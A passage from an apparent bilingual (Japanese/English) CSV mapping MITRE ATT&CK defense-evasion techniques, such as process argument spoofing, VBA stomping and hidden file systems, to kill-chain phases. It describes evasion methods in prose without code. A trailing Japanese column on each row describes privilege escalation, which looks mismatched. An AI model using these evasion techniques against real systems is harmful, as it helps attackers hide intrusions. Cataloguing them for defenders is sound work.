Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1564,アーティファクトの隠蔽,Hide Artifacts,"攻撃者は、検出を回避するために、自身の行動に関連するアーティファクトを隠そうとする可能性があります。オペレーティングシステムには、ユーザーの作業環境を妨害したり、ユーザーがシステム上のファイルや機能を変更したりするのを防ぐために、重要なシステムファイルや管理タスクの実行など、さまざまなアーティファクトを隠す機能がある場合があります。攻撃者はこれらの機能を悪用して、ファイル、ディレクトリ、ユーザーアカウント、またはその他のシステムアクティビティなどのアーティファクトを隠し、検出を回避する可能性があります。(引用: Sofacy Komplex Trojan)(引用: Cybereason OSX Pirrit)(引用: MalwareBytes ADS July 2015)

攻撃者はまた、仮想化テクノロジの使用などを通じて、一般的なセキュリティ計測から隔離されたコンピューティング領域を作成することにより、悪意のある行動に関連するアーティファクトを隠そうとする可能性もあります。(引用: Sophos Ragnar May 2020)","Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.(Citation: Sofacy Komplex Trojan)(Citation: Cybereason OSX Pirrit)(Citation: MalwareBytes ADS July 2015)

Adversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.(Citation: Sophos Ragnar May 2020)",T1564.010,プロセス引数の偽装,Process Argument Spoofing,"攻撃者は、プロセスのメモリを上書きすることにより、プロセスのコマンドライン引数を隠そうとする可能性があります。プロセスのコマンドライン引数は、プロセス環境ブロック（PEB）に格納されます。PEBは、Windowsがプロセスに関するさまざまな情報やプロセスが使用する情報を格納するために使用するデータ構造です。PEBには、プロセスの実行時に参照されるプロセスのコマンドライン引数が含まれています。プロセスが作成されると、プロセス作成を監視する防御ツール/センサーがPEBからプロセス引数を取得する場合があります。(引用: Microsoft PEB 2021)(引用: Xpn Argue Like Cobalt 2019)

攻撃者は、防御を回避するためにプロセスのPEBを操作する可能性があります。例えば、[プロセスハロウイング](https://attack.mitre.org/techniques/T1055/012)を悪用して、良性の引数でプロセスを中断状態で起動できます。プロセスが起動されPEBが初期化された後（そしてプロセス情報がツール/センサーによって潜在的にログに記録された後）、攻撃者はPEBを上書きしてコマンドライン引数を変更し（例：[ネイティブAPI](https://attack.mitre.org/techniques/T1106) <code>WriteProcessMemory()</code>関数を使用）、その後悪意のある引数でプロセスの実行を再開する可能性があります。(引用: Cobalt Strike Arguments 2019)(引用: Xpn Argue Like Cobalt 2019)(引用: Nviso Spoof Command Line 2020)

攻撃者はまた、悪意のあるコマンドライン引数でプロセスを実行し、その後、後続のプロセスメモリ分析をバイパスする可能性のある良性の引数でメモリにパッチを適用する可能性もあります。(引用: FireEye FiveHands April 2021)

この動作は、プロセスベースの検出を操作したりさらに回避したりするために、他のトリック（[親PIDスプーフィング](https://attack.mitre.org/techniques/T1134/004)など）と組み合わせることもできます。","Adversaries may attempt to hide process command-line arguments by overwriting process memory. Process command-line arguments are stored in the process environment block (PEB), a data structure used by Windows to store various information about/used by a process. The PEB includes the process command-line arguments that are referenced when executing the process. When a process is created, defensive tools/sensors that monitor process creations may retrieve the process arguments from the PEB.(Citation: Microsoft PEB 2021)(Citation: Xpn Argue Like Cobalt 2019)

Adversaries may manipulate a process PEB to evade defenses. For example, [Process Hollowing](https://attack.mitre.org/techniques/T1055/012) can be abused to spawn a process in a suspended state with benign arguments. After the process is spawned and the PEB is initialized (and process information is potentially logged by tools/sensors), adversaries may override the PEB to modify the command-line arguments (ex: using the [Native API](https://attack.mitre.org/techniques/T1106) <code>WriteProcessMemory()</code> function) then resume process execution with malicious arguments.(Citation: Cobalt Strike Arguments 2019)(Citation: Xpn Argue Like Cobalt 2019)(Citation: Nviso Spoof Command Line 2020)

Adversaries may also execute a process with malicious command-line arguments then patch the memory with benign arguments that may bypass subsequent process memory analysis.(Citation: FireEye FiveHands April 2021)

This behavior may also be combined with other tricks (such as [Parent PID Spoofing](https://attack.mitre.org/techniques/T1134/004)) to manipulate or further evade process-based detections.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1564,アーティファクトの隠蔽,Hide Artifacts,"攻撃者は、検出を回避するために、自身の行動に関連するアーティファクトを隠そうとする可能性があります。オペレーティングシステムには、ユーザーの作業環境を妨害したり、ユーザーがシステム上のファイルや機能を変更したりするのを防ぐために、重要なシステムファイルや管理タスクの実行など、さまざまなアーティファクトを隠す機能がある場合があります。攻撃者はこれらの機能を悪用して、ファイル、ディレクトリ、ユーザーアカウント、またはその他のシステムアクティビティなどのアーティファクトを隠し、検出を回避する可能性があります。(引用: Sofacy Komplex Trojan)(引用: Cybereason OSX Pirrit)(引用: MalwareBytes ADS July 2015)

攻撃者はまた、仮想化テクノロジの使用などを通じて、一般的なセキュリティ計測から隔離されたコンピューティング領域を作成することにより、悪意のある行動に関連するアーティファクトを隠そうとする可能性もあります。(引用: Sophos Ragnar May 2020)","Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.(Citation: Sofacy Komplex Trojan)(Citation: Cybereason OSX Pirrit)(Citation: MalwareBytes ADS July 2015)

Adversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.(Citation: Sophos Ragnar May 2020)",T1564.001,隠しファイルとディレクトリ,Hidden Files and Directories,"攻撃者は、検出メカニズムを回避するためにファイルやディレクトリを非表示に設定する可能性があります。通常のユーザーがシステム上の特別なファイルを誤って変更するのを防ぐために、ほとんどのオペレーティングシステムには「隠し」ファイルの概念があります。これらのファイルは、ユーザーがGUIでファイルシステムを参照したり、コマンドラインで通常のコマンドを使用したりしても表示されません。ユーザーは、一連のグラフィカルユーザーインターフェイス（GUI）プロンプトを介するか、コマンドラインスイッチ（Windowsの場合は<code>dir /a</code>、LinuxおよびmacOSの場合は<code>ls –a</code>）を使用して、隠しファイルを表示するように明示的に要求する必要があります。

LinuxおよびMacでは、ユーザーはファイルまたはフォルダ名の最初の文字として「.」を置くだけで、特定のファイルを非表示としてマークできます。(引用: Sofacy Komplex Trojan)(引用: Antiquated Mac Malware) ピリオド「.」で始まるファイルおよびフォルダは、デフォルトではFinderアプリケーションおよび「ls」などの標準コマンドラインユーティリティでの表示から隠されています。ユーザーは、これらのファイルを表示可能にするために設定を具体的に変更する必要があります。

macOS上のファイルは、Finder.appでの表示を防ぐUF_HIDDENフラグでマークすることもできますが、Terminal.appでの表示は引き続き可能です。(引用: WireLurker) Windowsでは、ユーザーはattrib.exeバイナリを使用して特定のファイルを非表示としてマークできます。多くのアプリケーションは、ユーザーのワークスペースを乱雑にしないように情報を保存するために、これらの隠しファイルやフォルダを作成します。たとえば、SSHユーティリティは、ユーザーの既知のホストとキーを含む非表示の.sshフォルダを作成します。

攻撃者はこれを利用して、システム上のどこにでもファイルやフォルダを隠し、隠しファイルの調査を組み込んでいない一般的なユーザーまたはシステム分析を回避できます。","Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and <code>ls –a</code> for Linux and macOS).

On Linux and Mac, users can mark specific files as hidden simply by putting a “.” as the first character in the file or folder name  (Citation: Sofacy Komplex Trojan) (Citation: Antiquated Mac Malware). Files and folders that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like “ls”. Users must specifically change settings to have these files viewable.

Files on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app (Citation: WireLurker). On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.

Adversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1564,アーティファクトの隠蔽,Hide Artifacts,"攻撃者は、検出を回避するために、自身の行動に関連するアーティファクトを隠そうとする可能性があります。オペレーティングシステムには、ユーザーの作業環境を妨害したり、ユーザーがシステム上のファイルや機能を変更したりするのを防ぐために、重要なシステムファイルや管理タスクの実行など、さまざまなアーティファクトを隠す機能がある場合があります。攻撃者はこれらの機能を悪用して、ファイル、ディレクトリ、ユーザーアカウント、またはその他のシステムアクティビティなどのアーティファクトを隠し、検出を回避する可能性があります。(引用: Sofacy Komplex Trojan)(引用: Cybereason OSX Pirrit)(引用: MalwareBytes ADS July 2015)

攻撃者はまた、仮想化テクノロジの使用などを通じて、一般的なセキュリティ計測から隔離されたコンピューティング領域を作成することにより、悪意のある行動に関連するアーティファクトを隠そうとする可能性もあります。(引用: Sophos Ragnar May 2020)","Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.(Citation: Sofacy Komplex Trojan)(Citation: Cybereason OSX Pirrit)(Citation: MalwareBytes ADS July 2015)

Adversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.(Citation: Sophos Ragnar May 2020)",T1564.004,NTFSファイル属性,NTFS File Attributes,"攻撃者は、検出を回避するためにNTFSファイル属性を使用して悪意のあるデータを隠す可能性があります。すべての新しいテクノロジファイルシステム（NTFS）でフォーマットされたパーティションには、パーティション上のすべてのファイル/ディレクトリのレコードを保持するマスターファイルテーブル（MFT）が含まれています。(引用: SpectorOps Host-Based Jul 2017) MFTエントリ内には、拡張属性（EA）やデータ[複数のデータ属性が存在する場合は代替データストリーム（ADS）として知られる]などのファイル属性があり、これらは任意のデータ（完全なファイルさえも）を格納するために使用できます。(引用: SpectorOps Host-Based Jul 2017)(引用: Microsoft File Streams)(引用: MalwareBytes ADS July 2015)(引用: Microsoft ADS Mar 2014)

攻撃者は、ファイルに直接ではなくファイル属性メタデータに悪意のあるデータやバイナリを保存する可能性があります。これは、静的インジケータスキャンツールやウイルス対策などの一部の防御を回避するために行われる可能性があります。(引用: Journey into IR ZeroAccess NTFS EA)(引用: MalwareBytes ADS July 2015)","Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition. (Citation: SpectorOps Host-Based Jul 2017) Within MFT entries are file attributes, (Citation: Microsoft NTFS File Attributes Aug 2010) such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files). (Citation: SpectorOps Host-Based Jul 2017) (Citation: Microsoft File Streams) (Citation: MalwareBytes ADS July 2015) (Citation: Microsoft ADS Mar 2014)

Adversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus. (Citation: Journey into IR ZeroAccess NTFS EA) (Citation: MalwareBytes ADS July 2015)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1564,アーティファクトの隠蔽,Hide Artifacts,"攻撃者は、検出を回避するために、自身の行動に関連するアーティファクトを隠そうとする可能性があります。オペレーティングシステムには、ユーザーの作業環境を妨害したり、ユーザーがシステム上のファイルや機能を変更したりするのを防ぐために、重要なシステムファイルや管理タスクの実行など、さまざまなアーティファクトを隠す機能がある場合があります。攻撃者はこれらの機能を悪用して、ファイル、ディレクトリ、ユーザーアカウント、またはその他のシステムアクティビティなどのアーティファクトを隠し、検出を回避する可能性があります。(引用: Sofacy Komplex Trojan)(引用: Cybereason OSX Pirrit)(引用: MalwareBytes ADS July 2015)

攻撃者はまた、仮想化テクノロジの使用などを通じて、一般的なセキュリティ計測から隔離されたコンピューティング領域を作成することにより、悪意のある行動に関連するアーティファクトを隠そうとする可能性もあります。(引用: Sophos Ragnar May 2020)","Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.(Citation: Sofacy Komplex Trojan)(Citation: Cybereason OSX Pirrit)(Citation: MalwareBytes ADS July 2015)

Adversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.(Citation: Sophos Ragnar May 2020)",T1564.007,VBAストンピング,VBA Stomping,"攻撃者は、MS Officeドキュメントに埋め込まれた悪意のあるVisual Basic for Applications（VBA）ペイロードを、VBAソースコードを良性のデータに置き換えることによって隠す可能性があります。(引用: FireEye VBA stomp Feb 2020)

VBAコンテンツが埋め込まれたMS Officeドキュメントは、モジュールストリーム内にソースコードを格納します。各モジュールストリームには、p-codeとして知られるVBAソースコードの個別のコンパイル済みバージョンを格納する<code>PerformanceCache</code>があります。p-codeは、VBAプロジェクトのバージョン依存の説明を含む<code>_VBA_PROJECT</code>ストリームで指定されたMS OfficeバージョンがホストMS Officeアプリケーションのバージョンと一致する場合に実行されます。(引用: Evil Clippy May 2019)(引用: Microsoft _VBA_PROJECT Stream)

攻撃者は、VBAソースコードの場所をゼロ、良性のコード、またはランダムなバイトで上書きし、以前にコンパイルされた悪意のあるp-codeを残すことにより、悪意のあるVBAコードを隠す可能性があります。悪意のあるVBAソースコードをスキャンするツールは、不要なコードがコンパイル済みのp-codeに隠されているため、バイパスされる可能性があります。VBAソースコードが削除された場合、一部のツールはマクロが存在しないと判断することさえあります。<code>_VBA_PROJECT</code>ストリームとホストMS Officeアプリケーションの間にバージョンの一致がある場合、p-codeが実行されます。そうでない場合は、良性のVBAソースコードが解凍されてp-codeに再コンパイルされ、悪意のあるp-codeが削除され、動的分析がバイパスされる可能性があります。(引用: Walmart Roberts Oct 2018)(引用: FireEye VBA stomp Feb 2020)(引用: pcodedmp Bontchev)","Adversaries may hide malicious Visual Basic for Applications (VBA) payloads embedded within MS Office documents by replacing the VBA source code with benign data.(Citation: FireEye VBA stomp Feb 2020)

MS Office documents with embedded VBA content store source code inside of module streams. Each module stream has a <code>PerformanceCache</code> that stores a separate compiled version of the VBA source code known as p-code. The p-code is executed when the MS Office version specified in the <code>_VBA_PROJECT</code> stream (which contains the version-dependent description of the VBA project) matches the version of the host MS Office application.(Citation: Evil Clippy May 2019)(Citation: Microsoft _VBA_PROJECT Stream)

An adversary may hide malicious VBA code by overwriting the VBA source code location with zero’s, benign code, or random bytes while leaving the previously compiled malicious p-code. Tools that scan for malicious VBA source code may be bypassed as the unwanted code is hidden in the compiled p-code. If the VBA source code is removed, some tools might even think that there are no macros present. If there is a version match between the <code>_VBA_PROJECT</code> stream and host MS Office application, the p-code will be executed, otherwise the benign VBA source code will be decompressed and recompiled to p-code, thus removing malicious p-code and potentially bypassing dynamic analysis.(Citation: Walmart Roberts Oct 2018)(Citation: FireEye VBA stomp Feb 2020)(Citation: pcodedmp Bontchev)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1564,アーティファクトの隠蔽,Hide Artifacts,"攻撃者は、検出を回避するために、自身の行動に関連するアーティファクトを隠そうとする可能性があります。オペレーティングシステムには、ユーザーの作業環境を妨害したり、ユーザーがシステム上のファイルや機能を変更したりするのを防ぐために、重要なシステムファイルや管理タスクの実行など、さまざまなアーティファクトを隠す機能がある場合があります。攻撃者はこれらの機能を悪用して、ファイル、ディレクトリ、ユーザーアカウント、またはその他のシステムアクティビティなどのアーティファクトを隠し、検出を回避する可能性があります。(引用: Sofacy Komplex Trojan)(引用: Cybereason OSX Pirrit)(引用: MalwareBytes ADS July 2015)

攻撃者はまた、仮想化テクノロジの使用などを通じて、一般的なセキュリティ計測から隔離されたコンピューティング領域を作成することにより、悪意のある行動に関連するアーティファクトを隠そうとする可能性もあります。(引用: Sophos Ragnar May 2020)","Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.(Citation: Sofacy Komplex Trojan)(Citation: Cybereason OSX Pirrit)(Citation: MalwareBytes ADS July 2015)

Adversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.(Citation: Sophos Ragnar May 2020)",T1564.005,隠しファイルシステム,Hidden File System,"攻撃者は、隠しファイルシステムを使用して、ユーザーやセキュリティツールから悪意のあるアクティビティを隠す可能性があります。ファイルシステムは、物理ストレージからデータを保存およびアクセスするための構造を提供します。通常、ユーザーは、ファイルやディレクトリへのアクセスを可能にするアプリケーションを介してファイルシステムと対話します。これらは、物理的な場所（ディスクセクターなど）からの抽象化です。標準的なファイルシステムには、FAT、NTFS、ext4、APFSなどがあります。ファイルシステムには、NTFSのボリュームブートレコード（VBR）やマスターファイルテーブル（MFT）など、他の構造も含まれる場合があります。(引用: MalwareTech VFS Nov 2014)

攻撃者は、感染したシステムに存在する標準のファイルシステムとは別の、独自の抽象化されたファイルシステムを使用する可能性があります。そうすることで、攻撃者は悪意のあるコンポーネントやファイルの入出力をセキュリティツールから隠すことができます。隠しファイルシステム（仮想ファイルシステムと呼ばれることもあります）は、さまざまな方法で実装できます。1つの実装方法は、ディスク構造や標準のファイルシステムパーティションで使用されていない予約済みディスクスペースにファイルシステムを格納することです。(引用: MalwareTech VFS Nov 2014)(引用: FireEye Bootkits) 別の実装方法としては、攻撃者が独自のポータブルパーティションイメージをファイルとして標準のファイルシステムの上にドロップすることが考えられます。(引用: ESET ComRAT May 2020) 攻撃者はまた、既存のファイルシステム構造全体に非標準的な方法でファイルを断片化する可能性もあります。(引用: Kaspersky Equation QA)","Adversaries may use a hidden file system to conceal malicious activity from users and security tools. File systems provide a structure to store and access data from physical storage. Typically, a user engages with a file system through applications that allow them to access files and directories, which are an abstraction from their physical location (ex: disk sector). Standard file systems include FAT, NTFS, ext4, and APFS. File systems can also contain other structures, such as the Volume Boot Record (VBR) and Master File Table (MFT) in NTFS.(Citation: MalwareTech VFS Nov 2014)

Adversaries may use their own abstracted file system, separate from the standard file system present on the infected system. In doing so, adversaries can hide the presence of malicious components and file input/output from security tools. Hidden file systems, sometimes referred to as virtual file systems, can be implemented in numerous ways. One implementation would be to store a file system in reserved disk space unused by disk structures or standard file system partitions.(Citation: MalwareTech VFS Nov 2014)(Citation: FireEye Bootkits) Another implementation could be for an adversary to drop their own portable partition image as a file on top of the standard file system.(Citation: ESET ComRAT May 2020) Adversaries may also fragment files across the existing file system structure in non-standard ways.(Citation: Kaspersky Equation QA)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1202,間接コマンド実行,Indirect Command Execution,"攻撃者は、コマンドラインインタプリタの使用を制限するセキュリティ制限をバイパスするために、コマンド実行を許可するユーティリティを悪用する可能性があります。さまざまなWindowsユーティリティを使用して、おそらく[cmd](https://attack.mitre.org/software/S0106)を呼び出すことなくコマンドを実行できます。例えば、[Forfiles](https://attack.mitre.org/software/S0193)、プログラム互換性アシスタント（`pcalua.exe`）、Windows Subsystem for Linux（WSL）のコンポーネント、`Scriptrunner.exe`、およびその他のユーティリティは、[コマンドおよびスクリプトインタープリタ](https://attack.mitre.org/techniques/T1059)、実行ウィンドウ、またはスクリプトを介してプログラムやコマンドの実行を呼び出す可能性があります。(引用: VectorSec ForFiles Aug 2017)(引用: Evi1cg Forfiles Nov 2017)(引用: Secure Team - Scriptrunner.exe)(引用: SS64)(引用: Bleeping Computer - Scriptrunner.exe) 攻撃者はまた、`ssh.exe`バイナリを悪用して、`-o`フラグを介して呼び出すか、SSH構成ファイルを変更することによって呼び出すことができる`ProxyCommand`および`LocalCommand`オプションを介して悪意のあるコマンドを実行する可能性があります。(引用: Threat Actor Targets the Manufacturing industry with Lumma Stealer and Amadey Bot)

攻撃者は、これらの機能を[防御回避](https://attack.mitre.org/tactics/TA0005)のために悪用する可能性があり、具体的には、[cmd](https://attack.mitre.org/software/S0106)の使用や悪意のあるペイロードに一般的に関連付けられているファイル拡張子の使用を制限/防止する検出や緩和制御（グループポリシーなど）を破壊しながら任意の実行を実行するためです。","Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking [cmd](https://attack.mitre.org/software/S0106). For example, [Forfiles](https://attack.mitre.org/software/S0193), the Program Compatibility Assistant (`pcalua.exe`), components of the Windows Subsystem for Linux (WSL), `Scriptrunner.exe`, as well as other utilities may invoke the execution of programs and commands from a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), Run window, or via scripts.(Citation: VectorSec ForFiles Aug 2017)(Citation: Evi1cg Forfiles Nov 2017)(Citation: Secure Team - Scriptrunner.exe)(Citation: SS64)(Citation: Bleeping Computer - Scriptrunner.exe) Adversaries may also abuse the `ssh.exe` binary to execute malicious commands via the `ProxyCommand` and `LocalCommand` options, which can be invoked via the `-o` flag or by modifying the SSH config file.(Citation: Threat Actor Targets the Manufacturing industry with Lumma Stealer and Amadey Bot)

Adversaries may abuse these features for [Defense Evasion](https://attack.mitre.org/tactics/TA0005), specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of [cmd](https://attack.mitre.org/software/S0106) or file extensions more commonly associated with malicious payloads.",,,,,,5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

